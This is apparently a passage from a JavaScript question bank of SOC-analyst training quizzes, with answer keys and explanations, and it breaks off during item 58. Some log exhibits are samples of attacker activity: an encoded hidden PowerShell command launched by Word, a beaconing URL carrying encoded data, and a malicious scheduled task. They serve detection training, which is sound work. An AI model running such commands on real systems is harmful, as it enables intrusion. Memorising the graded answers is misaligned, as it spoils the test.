/*
 * CyberQuiz question bank - role-based edition (1500 questions)
 *
 * Required properties:
 * id, rank, role, topic, difficulty, q, options,
 * correct, why, hint
 *
 * Optional:
 * exhibit (plain text with line breaks: an email, message headers,
 * log excerpt, configuration, code or command output that the
 * question refers to; shown above or beside the question text)
 *
 * Roles (250 questions each, six roles):
 * const CAREER_ROLES = ['soc','pentest','grc','security-engineering','cloud-security','digital-forensics'];
 *
 * Rank levels (50 questions per role per rank, 300 per rank overall):
 * 0 = Associate     1 = Professional   2 = Practitioner
 * 3 = Architect     4 = Expert
 * Total: 6 roles x 5 ranks x 50 questions = 1500 questions
 *
 * Ids: role-major in blocks of 250 (soc 1-250, pentest 251-500,
 * grc 501-750, security-engineering 751-1000, cloud-security 1001-1250,
 * digital-forensics 1251-1500);
 * inside each role the ranks run 0 to 4 in blocks of 50.
 *
 * Question types: single-answer questions and "best answer" questions.
 * In the 188 best-answer questions (all marked BEST in q) two options are
 * defensible and only one is the BEST choice for the scenario; the
 * explanation (why) names the runner-up and says why it is weaker.
 *
 * Exhibits: 244 questions include an exhibit (logs, configurations,
 * policies, reports, tables and command output).
 *
 * Pentest note: questions for the pentest role cover scoping, rules of
 * engagement, reporting, risk rating, remediation and validation of
 * findings, and detection and governance; they contain no exploitation
 * procedures.
 *
 * Correct-answer positions are balanced: A=375, B=376, C=375, D=374
 * overall, and within each role and rank group of 50 each letter appears 12 or 13 times.
 *
 * Answer-length balance: in each role-rank group of 50 the correct option
 * is the longest in about a quarter of questions and the shortest in about
 * a quarter, so no consistent length pattern identifies it.
 */

window.CYBERQUIZ_QUESTIONS = [
  {
    id: 1, rank: 0, role: "soc", topic: "Alert Versus Incident", difficulty: "BEGINNER",
    q: "In a SOC, what is the difference between an alert and an incident?",
    options: ["They mean the same thing, and are used in the same way in every SOC","An alert is written by management, while an incident is a report written by the software vendor","An alert is always a confirmed attack, while an incident is only a user complaint about slow systems","An alert is a signal to check, an incident is confirmed harm"],
    correct: 3, why: "Alerts are signals that may or may not be real; an incident is confirmed or strongly suspected harm that needs a response process.",
    hint: "Signal versus confirmed event."
  },
  {
    id: 2, rank: 0, role: "soc", topic: "False Positive Meaning", difficulty: "BEGINNER",
    q: "An alert fires for an authorised nightly backup that copies many files. What is this alert called?",
    options: ["A false positive, and the rule needs tuning","A true positive, as the copying really happened, and it needs escalation","A zero-day, as nobody had seen the pattern before","A false negative, as the backup was missed"],
    correct: 0, why: "The rule fired on benign activity, which is a false positive; it should be tuned rather than ignored.",
    hint: "The rule fired, but nothing was wrong."
  },
  {
    id: 3, rank: 0, role: "soc", topic: "Failed Logon Burst", difficulty: "BEGINNER",
    exhibit: "2026-03-02 09:14:01 FAIL user=alice src=203.0.113.50\n2026-03-02 09:14:03 FAIL user=bob src=203.0.113.50\n2026-03-02 09:14:05 FAIL user=carol src=203.0.113.50\n2026-03-02 09:14:07 FAIL user=dave src=203.0.113.50\n2026-03-02 09:14:09 FAIL user=erin src=203.0.113.50",
    q: "Which conclusion best fits this authentication log extract?",
    options: ["Routine renewal of service account credentials by the identity team","A successful brute force of one administrator account","Possible password spraying from one source, in most cases","A single user who forgot their password after a holiday, and is retrying"],
    correct: 2, why: "One source tried failed logons across many different accounts in seconds, which is a spraying pattern rather than a forgotten password.",
    hint: "Many accounts, one source."
  },
  {
    id: 4, rank: 0, role: "soc", topic: "Reporting a Suspicious Email", difficulty: "BEGINNER",
    q: "A user forwards a suspicious email to the SOC. What should the analyst do first?",
    options: ["Reply to the sender, and ask whether the email is genuine","Check the headers, links and attachment safely and see who else received it","Open the attachment on a normal laptop to see what it does","Delete the email, and close the ticket without a reply"],
    correct: 1, why: "Safe analysis and checking for other recipients scopes the campaign; opening attachments on a normal laptop or replying exposes the analyst.",
    hint: "Analyse safely and scope."
  },
  {
    id: 5, rank: 0, role: "soc", topic: "Time Synchronisation", difficulty: "BEGINNER",
    q: "Why must log sources use synchronised clocks?",
    options: ["So that logs take less disk space on every server, and in every backup","So that nightly backups run faster, and finish before the working day","So that events can be put in order across systems, during an investigation","So that users see the same wallpaper on every company computer"],
    correct: 2, why: "Correlating events across systems depends on consistent timestamps, so NTP is a basic logging requirement.",
    hint: "Ordering events."
  },
  {
    id: 6, rank: 0, role: "soc", topic: "Alert Priority", difficulty: "BEGINNER",
    q: "Two alerts arrive together: malware detected on a finance server and a blocked port scan from the internet. Which comes first?",
    options: ["The malware detection on the finance server","Neither of them, as both were handled by automatic tools","The blocked scan, as it arrived first and the queue works in order","Whichever alert has the shorter text, and is quicker to close"],
    correct: 0, why: "A detection on a business-critical internal server suggests something already got in, while a blocked scan is routine noise.",
    hint: "Inside beats outside."
  },
  {
    id: 7, rank: 0, role: "soc", topic: "Escalation Trigger", difficulty: "BEGINNER",
    q: "An analyst sees a domain admin account signing in from a new country at 3 a.m. What is the BEST action?",
    options: ["Escalate to the incident lead and start containing the account","Close the alert as a likely holiday sign-in by the administrator","Email the admin, and wait for a reply before doing anything else","Add a note to the ticket, and review it again tomorrow morning"],
    correct: 0, why: "Waiting for the admin to answer is the runner-up and gives context, but a privileged account in a new country is high risk, so escalate and contain first.",
    hint: "Privileged and unusual."
  },
  {
    id: 8, rank: 0, role: "soc", topic: "Beaconing Pattern", difficulty: "BEGINNER",
    q: "Which network pattern most suggests malware calling home at fixed intervals?",
    options: ["A large download from a software vendor during the monthly patch cycle","A short burst of traffic when staff open the morning email","Small outbound connections to one address at regular intervals","A video conference with several participants at noon"],
    correct: 2, why: "Small, regular, repeated outbound connections to one destination are typical beaconing behaviour.",
    hint: "Regular timing."
  },
  {
    id: 9, rank: 0, role: "soc", topic: "Handling Sensitive Samples", difficulty: "BEGINNER",
    q: "An analyst wants to check a suspicious file that came from a customer. What is the BEST approach?",
    options: ["Open it on a normal laptop, as that is the quickest way to learn more","Upload the whole file to a public service, and anyone can analyse it","Ask the customer to run it and describe what happens on screen","Look up its hash, then use an internal sandbox for more detail"],
    correct: 3, why: "A hash lookup is the runner-up as it is quick, but it reveals nothing about the content; public uploads can leak customer data, so an internal sandbox is the safer next step.",
    hint: "Do not leak the file."
  },
  {
    id: 10, rank: 0, role: "soc", topic: "Isolating a Host", difficulty: "BEGINNER",
    q: "EDR shows ransomware activity on a laptop. What is the best immediate action?",
    options: ["Isolate the host in the EDR console, and tell the incident lead","Let the user keep working while the SOC watches for more activity","Switch the laptop off, and put it away in a cupboard until next week","Wipe it and reinstall the system before anyone has looked at it"],
    correct: 0, why: "Isolation stops spread while keeping memory and disk evidence available; wiping destroys evidence.",
    hint: "Stop spread, keep evidence."
  },
  {
    id: 11, rank: 0, role: "soc", topic: "Log Retention Purpose", difficulty: "BEGINNER",
    q: "Why do SOC teams keep logs for a defined retention period?",
    options: ["To speed up the deletion of old logs from the storage platform","To measure the time analysts spend on each ticket they handle, as a general rule","To allow investigations of past events and meet legal needs, in most cases","To replace the need for taking a backup of the affected system"],
    correct: 2, why: "Retention lets analysts look back over past activity and satisfies legal and audit requirements.",
    hint: "Look back."
  },
  {
    id: 12, rank: 0, role: "soc", topic: "Event 4625", difficulty: "BEGINNER",
    exhibit: "EventID: 4625\nAccount: svc-backup\nLogon Type: 3\nSource Network Address: 198.51.100.23\nFailure Reason: Unknown user name or bad password",
    q: "What does this Windows event record indicate?",
    options: ["A successful logon by an administrator from another network","A password change made by the helpdesk for a locked-out user, as a general rule","A failed logon attempt for the named account, in most cases","A user logging off cleanly at the end of their working day, in most cases"],
    correct: 2, why: "Event ID 4625 is a failed logon; the logon type and source address help decide whether it is an attack or a typo.",
    hint: "4625 is a failure."
  },
  {
    id: 13, rank: 0, role: "soc", topic: "DNS Query Review", difficulty: "BEGINNER",
    q: "Which DNS log entry is the most suspicious for a normal office workstation?",
    options: ["A query for a well known software update site, in most cases","A long random subdomain of a newly registered domain","A query for the company's own mail server, as a general rule","A query for the internal file server"],
    correct: 1, why: "Long random subdomains on young domains are typical of DNS tunnelling or malware command channels.",
    hint: "Long and random."
  },
  {
    id: 14, rank: 0, role: "soc", topic: "Shift Handover", difficulty: "BEGINNER",
    q: "What should a good SOC shift handover contain?",
    options: ["Personal opinions about colleagues, and which analysts worked slowly","Only the number of tickets closed during the shift, and the time each took","Nothing, as the ticketing system keeps a full history of every shift","Open incidents, status and pending actions"],
    correct: 3, why: "Handover keeps ongoing work from being dropped, so open items, status and next steps must be passed on clearly.",
    hint: "Do not drop open work."
  },
  {
    id: 15, rank: 0, role: "soc", topic: "Ticket Quality", difficulty: "BEGINNER",
    q: "Which ticket note is the most useful for the next analyst?",
    options: ["Host, time, evidence reviewed, action taken and the reason","Ran some tools and found nothing of interest in the output","Checked it, looks fine to me and nothing else needs to be done","Spoke to the user, and they said everything was fine today"],
    correct: 0, why: "Notes should be specific and repeatable so another analyst can follow or challenge the decision.",
    hint: "Specific and repeatable."
  },
  {
    id: 16, rank: 0, role: "soc", topic: "USB Malware", difficulty: "BEGINNER",
    q: "A user plugged in a USB stick found in the car park and the antivirus then alerted. What is the best response?",
    options: ["Wait and see whether the antivirus alerts again later in the day, and review the outcome at the next monthly meeting","Format the USB stick and give it back to the user to reuse","Tell the user to ignore the alert, as the stick has been removed","Isolate the machine, and investigate what ran, and review the outcome at the next monthly meeting"],
    correct: 3, why: "Removing the stick does not remove anything that already executed, so contain the host and check what ran.",
    hint: "The stick was already used."
  },
  {
    id: 17, rank: 0, role: "soc", topic: "Reading Email Headers", difficulty: "BEGINNER",
    exhibit: "From: \"Payroll\" <payroll@contoso-hr.com>\nReturn-Path: <bounce@mail-relay.example.net>\nReceived-SPF: fail (domain of contoso-hr.com does not designate 192.0.2.77)\nSubject: Update your bank details\nMessage-ID: <8231@mail-relay.example.net>",
    q: "In these headers, which detail best suggests the sender is spoofed?",
    options: ["Return-Path differs from From and SPF failed","The email contains a subject line asking for updated bank details","The recipient address appears in the To field of the message","The message has a Message-ID value generated by the sending server"],
    correct: 0, why: "SPF failure with a mismatched Return-Path suggests the sending server was not authorised for the visible domain.",
    hint: "Look at SPF and Return-Path."
  },
  {
    id: 18, rank: 0, role: "soc", topic: "True and False Negative", difficulty: "BEGINNER",
    q: "An attack happens, but no alert fires. How is this outcome described?",
    options: ["A true positive, as the attack was found and stopped in time","A false negative, meaning a detection gap","A true negative, as no alert was generated in the system","A false positive, as the system raised an alarm for nothing"],
    correct: 1, why: "A real malicious event that is missed is a false negative and points to a detection gap.",
    hint: "Missed attack."
  },
  {
    id: 19, rank: 0, role: "soc", topic: "Normal Baseline", difficulty: "BEGINNER",
    q: "Why do analysts learn what normal looks like for their network?",
    options: ["So that they can switch off most alerts, and save time every week","So that attackers cannot see how the network is arranged","So that they never need to use a ticketing system again","So that unusual behaviour stands out"],
    correct: 3, why: "Detection and triage depend on recognising deviations from known normal behaviour.",
    hint: "Normal first."
  },
  {
    id: 20, rank: 0, role: "soc", topic: "ATT&CK Purpose", difficulty: "BEGINNER",
    q: "What is the MITRE ATT&CK framework mainly used for?",
    options: ["Scoring the performance of individual SOC staff members, where that is practical","Describing attacker tactics and techniques in a common language","Replacing the need for a firewall on the network edge","Encrypting data in transit between two servers"],
    correct: 1, why: "ATT&CK is a knowledge base of adversary behaviour used to map detections, hunts and reports.",
    hint: "Common language for behaviour."
  },
  {
    id: 21, rank: 0, role: "soc", topic: "Incident Impact Types", difficulty: "BEGINNER",
    q: "Customer records are copied by an attacker. Which part of the CIA triad is mainly affected?",
    options: ["Confidentiality","Non-repudiation, as the customers cannot deny having sent them","Availability, as the records can no longer be used by the customers","Integrity, as the stored records were silently changed by the attacker"],
    correct: 0, why: "Unauthorised copying of data is a loss of confidentiality, even though the data is still there.",
    hint: "Who can see it."
  },
  {
    id: 22, rank: 0, role: "soc", topic: "Ransomware First Actions", difficulty: "BEGINNER",
    q: "Several file servers show encrypted files and a ransom note. What is the BEST first priority?",
    options: ["Pay the ransom quickly to stop the countdown timer, and review the outcome at the next monthly meeting","Contain affected systems and protect backups, then inform the incident lead","Delete the ransom note, and users are not alarmed","Reboot every server, and the malware is cleared from memory"],
    correct: 1, why: "Paying is the runner-up some leaders ask about, but it is not a first step; containment and backup protection limit damage and keep options open.",
    hint: "Stop spread, keep backups."
  },
  {
    id: 23, rank: 0, role: "soc", topic: "Traffic Light Protocol", difficulty: "BEGINNER",
    q: "A report is marked TLP:AMBER. How should it be handled?",
    options: ["Publish it on social media, and everyone can benefit from it","Print it, and leave a copy in the reception area","Send it to every customer in the monthly newsletter","Share only with those who need it, in most cases"],
    correct: 3, why: "TLP marks how far information may be shared; AMBER limits it to people who need it.",
    hint: "Marking limits sharing."
  },
  {
    id: 24, rank: 0, role: "soc", topic: "Log Retention Reason", difficulty: "BEGINNER",
    q: "Why do organisations keep logs for months rather than days?",
    options: ["Many intrusions are found long after they begin","Auditors prefer large archives over short and focused documents","Attackers always delete their own logs after exactly seven days","To use up spare disk space that was bought for other projects"],
    correct: 0, why: "Dwell time can be weeks or months, so older logs are needed to trace how and when an intrusion started.",
    hint: "Late discovery needs history."
  },
  {
    id: 25, rank: 0, role: "soc", topic: "IP Reputation Use", difficulty: "BEGINNER",
    q: "An analyst looks up an IP address in a reputation service and finds no reports. What is the safest conclusion?",
    options: ["It is not proof the IP is safe, so other evidence must be checked","The IP can never be used for attacks in the future","The IP belongs to the company, as the service has no reports","The IP is definitely safe, and the alert can be closed straight away"],
    correct: 0, why: "Absence of reports only means it has not been reported yet; new infrastructure is often clean at first.",
    hint: "No reports is not proof."
  },
  {
    id: 26, rank: 0, role: "soc", topic: "Internal Scanner Alerts", difficulty: "BEGINNER",
    q: "An alert shows port scanning from an internal host owned by the vulnerability scanning team. What should the analyst do?",
    options: ["Confirm it matches the schedule and document it","Delete the scanner's logs to keep the SIEM tidy","Ignore every future alert from that host from now on","Block the scanning team's whole network segment permanently, then record the result in the ticket"],
    correct: 0, why: "Authorised activity should still be verified against a schedule, then recorded, so unplanned scans are not missed.",
    hint: "Verify and document."
  },
  {
    id: 27, rank: 0, role: "soc", topic: "Proxy Log Reading", difficulty: "BEGINNER",
    exhibit: "10:00:01 GET http://intranet.corp/home 200 4120\n10:00:30 GET http://xk2v9.example-cdn.top/a.php?d=Zm9vYg== 200 64\n10:01:00 GET http://xk2v9.example-cdn.top/a.php?d=Zm9vYg== 200 64\n10:01:30 GET http://xk2v9.example-cdn.top/a.php?d=Zm9vYg== 200 64\n10:02:12 GET http://news.example.org/ 200 88211",
    q: "Which proxy log line deserves the closest attention?",
    options: ["A request to a well known news site, in most cases","A request to the company intranet home page","A request to the vendor's software update server","Regular small requests to a rare domain with encoded data"],
    correct: 3, why: "Regular small beacons to a rare domain suggest command and control activity.",
    hint: "Regular beacons."
  },
  {
    id: 28, rank: 0, role: "soc", topic: "Spraying Versus Brute Force", difficulty: "BEGINNER",
    q: "What distinguishes password spraying from a classic brute force attack?",
    options: ["They are the same technique, and only the names differ","Spraying only works against printers, and other network devices","Brute force never produces any failed logons in the logs, as a general rule","Spraying tries few passwords across many accounts, brute force tries many on one"],
    correct: 3, why: "Spraying avoids lockouts by spreading attempts, so it shows many accounts with few failures each.",
    hint: "Wide versus deep."
  },
  {
    id: 29, rank: 0, role: "soc", topic: "Compromised Account Signs", difficulty: "BEGINNER",
    q: "Which sign most strongly suggests a mailbox has been compromised?",
    options: ["The user sent an email at lunchtime","The mailbox is nearly full after months of use","The user has changed their email signature","A new hidden inbox rule forwarding mail outside"],
    correct: 3, why: "Hidden forwarding rules are a common attacker persistence technique after email account takeover.",
    hint: "Check the rules."
  },
  {
    id: 30, rank: 0, role: "soc", topic: "Playbook Purpose", difficulty: "BEGINNER",
    q: "What is the main purpose of an incident response playbook?",
    options: ["To store the backup tapes in a safe place","To give analysts consistent steps for a known incident type","To replace all human judgement during a live incident, as a general rule","To list every employee's phone number and home address, as a general rule"],
    correct: 1, why: "Playbooks make responses repeatable and faster, with room for judgement where needed.",
    hint: "Consistent steps."
  },
  {
    id: 31, rank: 0, role: "soc", topic: "Large Copy to USB", difficulty: "BEGINNER",
    q: "A user in HR copies 4 GB of files to a personal USB drive just before resigning. What is the BEST first step?",
    options: ["Confront the user at their desk, and take the drive away","Ignore it as the user is leaving the company in any case","Preserve the logs and inform HR and the incident lead","Block the user's account without telling anyone else"],
    correct: 2, why: "Confronting is the runner-up because it feels direct, but it risks evidence and employment issues; preserve evidence and use the agreed process.",
    hint: "Evidence and process first."
  },
  {
    id: 32, rank: 0, role: "soc", topic: "Why Use UTC", difficulty: "BEGINNER",
    q: "Why do many SOCs record incident times in UTC?",
    options: ["It makes the stored logs smaller on disk","It is required by every antivirus product","It stops attackers from reading the logs","It avoids confusion between time zones and daylight saving changes"],
    correct: 3, why: "One shared time standard avoids errors when correlating events from different regions.",
    hint: "One clock for all."
  },
  {
    id: 33, rank: 0, role: "soc", topic: "Alert Fatigue", difficulty: "BEGINNER",
    q: "What is the most likely result of a SOC receiving thousands of low-quality alerts every day?",
    options: ["Analysts miss real threats because they become used to noise","Backups run faster","Attackers are automatically blocked","Detection quality improves on its own"],
    correct: 0, why: "Too many false alerts hide real ones, so tuning is part of keeping detection effective.",
    hint: "Noise hides signal."
  },
  {
    id: 34, rank: 0, role: "soc", topic: "Unexpected MFA Prompts", difficulty: "BEGINNER",
    q: "A user reports repeated MFA approval prompts they did not request. What is the BEST response?",
    options: ["Disable MFA for that user to avoid further confusion, as a general rule","Tell them to approve once, and the prompts stop","Tell them to deny, reset their credentials and check sign-in logs","Wait to see whether the prompts continue tomorrow"],
    correct: 2, why: "Waiting is the runner-up and costs nothing, but prompts mean someone already has the password, so reset and investigate.",
    hint: "Someone has the password."
  },
  {
    id: 35, rank: 0, role: "soc", topic: "Lateral Movement Meaning", difficulty: "BEGINNER",
    q: "What is lateral movement?",
    options: ["A backup being copied to a new site overnight","An attacker moving from one system to others inside a network","A user changing desks to sit closer to the team","A firewall rule being edited by an administrator"],
    correct: 1, why: "After the first foothold, attackers move between systems to find valuable data and higher privileges.",
    hint: "Hopping between hosts."
  },
  {
    id: 36, rank: 0, role: "soc", topic: "Port Scan Meaning", difficulty: "BEGINNER",
    q: "What does a port scan from an external address usually indicate?",
    options: ["Someone is looking for open services","A user is logging in remotely from home","The antivirus is updating","A backup is running"],
    correct: 0, why: "Port scans map exposed services and are common internet background activity as well as an early attack step.",
    hint: "Mapping services."
  },
  {
    id: 37, rank: 0, role: "soc", topic: "Detection Metric", difficulty: "BEGINNER",
    q: "What does mean time to detect (MTTD) measure?",
    options: ["The length of the training courses","The number of staff working in the SOC, as a general rule","The time needed to buy new security tools","The average time between an attack starting and the SOC noticing it"],
    correct: 3, why: "MTTD shows how quickly threats are noticed and is one of the key SOC performance indicators.",
    hint: "Start to noticed."
  },
  {
    id: 38, rank: 0, role: "soc", topic: "Blocked Versus Allowed", difficulty: "BEGINNER",
    exhibit: "14:02:11 DENY  tcp 203.0.113.9:44211 -> 10.0.0.5:22\n14:02:11 DENY  tcp 203.0.113.9:44212 -> 10.0.0.5:22\n... (4998 more DENY lines)\n14:09:48 ALLOW tcp 203.0.113.9:51877 -> 10.0.0.20:443",
    q: "A firewall log shows one external IP blocked thousands of times and then one allowed connection. What is the BEST conclusion?",
    options: ["Assume the allowed connection is a test by the network team","Review the allowed connection first, as it may be what got through","Block the IP for a day, and close the ticket","Ignore it, as thousands of blocks show the firewall works"],
    correct: 1, why: "Treating the blocks as success is the runner-up; the allowed event is where harm could have happened, so it needs checking.",
    hint: "Check what got through."
  },
  {
    id: 39, rank: 0, role: "soc", topic: "Data Source Value", difficulty: "BEGINNER",
    q: "Which log source is the most useful for spotting a user signing in from a new location?",
    options: ["Air conditioning, and server room logs","Printer toner, and paper usage logs, in most cases","Identity provider sign-in logs, in most cases","Building lift, and door entry logs"],
    correct: 2, why: "Sign-in logs record account, time, location and result, so they show unusual access.",
    hint: "Where identity is recorded."
  },
  {
    id: 40, rank: 0, role: "soc", topic: "Closing an Alert Safely", difficulty: "BEGINNER",
    q: "Before closing a true positive alert, what should an analyst make sure of?",
    options: ["The user has been told the attacker's name","The root cause, actions taken and lessons are recorded","The alert is deleted from the SIEM","The ticket has a long title"],
    correct: 1, why: "Complete records let others learn from the case and let detection engineers improve the rule.",
    hint: "Record what was done."
  },
  {
    id: 41, rank: 0, role: "soc", topic: "Phishing Report Button", difficulty: "BEGINNER",
    q: "What should a user do first with a suspicious email at work?",
    options: ["Open the attachment in a safe folder to see what is inside it","Forward it to all colleagues and ask what they think about it","Report it using the approved reporting button","Reply to the sender, and ask them to confirm they are genuine"],
    correct: 2, why: "Reporting gives the SOC the message to analyse and lets it remove copies from other mailboxes.",
    hint: "Use the official route."
  },
  {
    id: 42, rank: 0, role: "soc", topic: "Failed Login Pattern", difficulty: "BEGINNER",
    exhibit: "09:14:01 FAIL user=j.adams src=203.0.113.50\n09:14:02 FAIL user=j.adams src=203.0.113.50\n09:14:03 FAIL user=j.adams src=203.0.113.50\n09:14:04 FAIL user=j.adams src=203.0.113.50\n09:14:05 FAIL user=j.adams src=203.0.113.50",
    q: "What does this authentication log excerpt most likely show?",
    options: ["A normal start of the working day for the finance team staff","Repeated failed sign-ins against one account","A scheduled backup job that completed with no errors at night, as a general rule","A software update that was installed on several servers at once"],
    correct: 1, why: "Many failures against one user in seconds suggest password guessing.",
    hint: "Count the failures."
  },
  {
    id: 43, rank: 0, role: "soc", topic: "Severity Levels", difficulty: "BEGINNER",
    q: "Why do SOCs define incident severity levels?",
    options: ["To limit the number of alerts that the tools are able to create","To set response priority, and escalation paths, in most cases","To decide which analyst receives the largest bonus each year","To replace the need for any written incident procedures, as a general rule"],
    correct: 1, why: "Severity ties the urgency of response and who is told to the impact of the incident.",
    hint: "Priority and escalation."
  },
  {
    id: 44, rank: 0, role: "soc", topic: "Antivirus Alert Triage", difficulty: "BEGINNER",
    q: "An antivirus alert shows a blocked file on one laptop. What is the BEST next step?",
    options: ["Re-image the laptop, and every other laptop in the company","Close the alert as the product has already blocked the file","Check for related activity on the host and confirm cleanup","Wait for the user to report that something looks wrong"],
    correct: 2, why: "Closing the alert is the runner-up as the file was blocked, but the analyst must confirm nothing else ran and how the file arrived.",
    hint: "Blocked is not the end."
  },
  {
    id: 45, rank: 0, role: "soc", topic: "Logging in UTC", difficulty: "BEGINNER",
    q: "Why should the SOC standardise on UTC for log timestamps?",
    options: ["It removes the need for synchronised clocks on servers","It makes the log files smaller on disk for long term storage","It gives one consistent timeline across regions","It stops attackers from reading the time of an event"],
    correct: 2, why: "A single time standard lets analysts order events from systems in different places.",
    hint: "One clock."
  },
  {
    id: 46, rank: 0, role: "soc", topic: "Suspicious Header Review", difficulty: "BEGINNER",
    exhibit: "From: Accounts <accounts@contoso.com>\nReply-To: payroll-update@c0ntoso-mail.net\nReturn-Path: <bounce@mailer.example.org>\nDate: Tue, 18 Nov 2025 08:02:11 +0000\nMIME-Version: 1.0\nContent-Type: text/html",
    q: "Which detail in these email headers is most suspicious?",
    options: ["The message passes through two internal mail gateways","The Reply-To domain differs from the sender domain, as a general rule","The message has a normal MIME version, and content type","The message carries a standard Date header from a mail server, in most cases"],
    correct: 1, why: "A different reply address is a common sign of a phishing attempt that wants replies to go elsewhere.",
    hint: "Compare the two domains."
  },
  {
    id: 47, rank: 0, role: "soc", topic: "Asset Value in Triage", difficulty: "BEGINNER",
    q: "Why does a SOC analyst check how important a server is when triaging an alert?",
    options: ["Alerts on critical systems need a faster response","Unimportant servers are never targeted by any attacker","Important servers never generate false alerts of any kind","It lets the analyst skip the alert on every other server"],
    correct: 0, why: "Business impact guides which alerts are worked first.",
    hint: "Impact drives order."
  },
  {
    id: 48, rank: 0, role: "soc", topic: "Port Scan Alert", difficulty: "BEGINNER",
    exhibit: "10:21:07 DENY 198.51.100.9 -> 10.0.5.20:21\n10:21:07 DENY 198.51.100.9 -> 10.0.5.20:22\n10:21:07 DENY 198.51.100.9 -> 10.0.5.20:23\n10:21:07 DENY 198.51.100.9 -> 10.0.5.20:80\n10:21:08 DENY 198.51.100.9 -> 10.0.5.20:443\n10:21:08 DENY 198.51.100.9 -> 10.0.5.20:3389",
    q: "What does this firewall log excerpt suggest?",
    options: ["A backup client copying files to storage overnight, in most cases","A mail server delivering messages to the gateway, as a general rule","One source probing many ports on a single host, as a general rule","A web browser loading a normal page from a server"],
    correct: 2, why: "Many different destination ports from one source in seconds is typical of reconnaissance scanning.",
    hint: "Look at the ports."
  },
  {
    id: 49, rank: 0, role: "soc", topic: "Strong Password Habits", difficulty: "BEGINNER",
    q: "Which habit gives the best protection for a personal work password?",
    options: ["A password that is shared with a trusted colleague for cover","A password based on the name of the user and the year, as a general rule","The same short password reused on every work and home site, as a general rule","A long unique passphrase kept in the approved password manager"],
    correct: 3, why: "Length and uniqueness resist guessing and reuse attacks.",
    hint: "Long and unique."
  },
  {
    id: 50, rank: 0, role: "soc", topic: "Alert Closure Notes", difficulty: "BEGINNER",
    q: "What should an analyst record when closing a false positive alert?",
    options: ["A promise that the same alert will never appear again","Why it was benign and what evidence supports that view","The name of the person that the analyst dislikes most","Only the word closed with no further details at all"],
    correct: 1, why: "Reasons help tuning and let others review the decision.",
    hint: "Record the why."
  },
  {
    id: 51, rank: 1, role: "soc", topic: "Encoded PowerShell Command", difficulty: "INTERMEDIATE",
    exhibit: "EventID 4688\nNewProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentProcessName: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\nCommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    q: "Which conclusion is best supported by this process creation event?",
    options: ["Word started PowerShell with an encoded command, a common malicious pattern","A normal administrator ran a scheduled patch script from the management server","The user opened a spreadsheet, and Excel updated its own add-ins in the background","The command is harmless as PowerShell is a signed Microsoft binary"],
    correct: 0, why: "An Office process spawning hidden PowerShell with -enc is typical of macro malware delivery and should be investigated.",
    hint: "Parent and arguments both matter."
  },
  {
    id: 52, rank: 1, role: "soc", topic: "Kerberoasting Evidence", difficulty: "INTERMEDIATE",
    exhibit: "EventID 4769 Account: jdoe Service: MSSQLSvc/db01 TicketEncryptionType: 0x17\nEventID 4769 Account: jdoe Service: HTTP/intranet TicketEncryptionType: 0x17\nEventID 4769 Account: jdoe Service: CIFS/files01 TicketEncryptionType: 0x17\nEventID 4769 Account: jdoe Service: MSSQLSvc/db02 TicketEncryptionType: 0x17",
    q: "Which pattern in domain controller logs most strongly suggests Kerberoasting?",
    options: ["A user changing their own password once during the working day","One user requesting many service tickets using RC4","Many failed interactive logons to a single shared workstation overnight","A computer account renewing its machine certificate on schedule"],
    correct: 1, why: "Kerberoasting requests service tickets for many SPNs, often with RC4, so they can be cracked offline.",
    hint: "Many service tickets, weak cipher."
  },
  {
    id: 53, rank: 1, role: "soc", topic: "Tuning a Noisy Rule", difficulty: "INTERMEDIATE",
    q: "A detection for admin tool use produces 300 false positives a day from the patching server. What is the BEST tuning approach?",
    options: ["Raise the threshold, and high that only mass activity is detected","Disable the rule until the patching project has finished","Tell analysts to ignore alerts from that rule during working hours, and review the outcome at the next monthly meeting","Add a narrow, documented exclusion for the patching host and account, until the next scheduled review takes place"],
    correct: 3, why: "Raising the threshold is the runner-up because it cuts volume, but it blinds the rule to real low-volume abuse; a narrow, reviewed exclusion keeps coverage.",
    hint: "Narrow and documented."
  },
  {
    id: 54, rank: 1, role: "soc", topic: "Sigma Rule Purpose", difficulty: "INTERMEDIATE",
    q: "What is the main advantage of writing detections as Sigma rules?",
    options: ["They are vendor neutral and convert to many SIEM languages","They remove the need for log collection from the endpoints","They guarantee that the rule produces no false positives at all","They run faster than any compiled code on every collector in the network"],
    correct: 0, why: "Sigma describes log-based detections in a generic format that converters turn into Splunk, KQL or other queries.",
    hint: "Write once, convert."
  },
  {
    id: 55, rank: 1, role: "soc", topic: "Reading a KQL Query", difficulty: "INTERMEDIATE",
    exhibit: "SigninLogs\n| where TimeGenerated > ago(1h) and ResultType != 0\n| summarize Failures=count() by UserPrincipalName, IPAddress\n| where Failures > 20",
    q: "What does this query return?",
    options: ["The number of users in each department that signed in this week","Accounts with over 20 failed sign-ins from one IP in the last hour","Every successful sign-in recorded across all applications during the previous day","All accounts whose passwords have expired, and need to be changed"],
    correct: 1, why: "The query filters failed sign-ins, groups by account and IP, and keeps groups above the threshold.",
    hint: "Read the where and summarize lines."
  },
  {
    id: 56, rank: 1, role: "soc", topic: "Beaconing Analysis", difficulty: "INTERMEDIATE",
    q: "Connections from one host to a rare external IP occur every 60 seconds with small constant payloads. What is the most likely explanation?",
    options: ["A user streaming a long training video from a public site","A large file download from the software vendor's mirror","Malware checking in with its command server","A web page loading many images from a content network"],
    correct: 2, why: "Fixed-interval small connections are typical of implants checking in with a server.",
    hint: "Regular timing is the clue."
  },
  {
    id: 57, rank: 1, role: "soc", topic: "Persistence by Scheduled Task", difficulty: "INTERMEDIATE",
    exhibit: "EventID 4698 TaskName: \\Updater TaskContent: <Exec><Command>C:\\Users\\Public\\Temp\\u.ps1</Command></Exec> SubjectUserName: helpdesk-tmp",
    q: "Which event best supports that an attacker created persistence on a server?",
    options: ["A scheduled task that runs the vendor's backup agent at night","An update to the monitoring agent installed by the platform team","The patching service restarting automatically after hours","An odd account created a task running a script from a public folder, as a general rule"],
    correct: 3, why: "Tasks launching scripts from writable user paths, created by unexpected accounts, are a standard persistence technique.",
    hint: "Odd creator, odd path."
  },
  {
    id: 58, rank: 1, role: "soc", topic: "Triage of EDR Detection", difficulty: "INTERMEDIATE",
    q: "EDR flags a credential dumping tool on a developer workstation. The developer says it was a security test. What is the BEST action?",
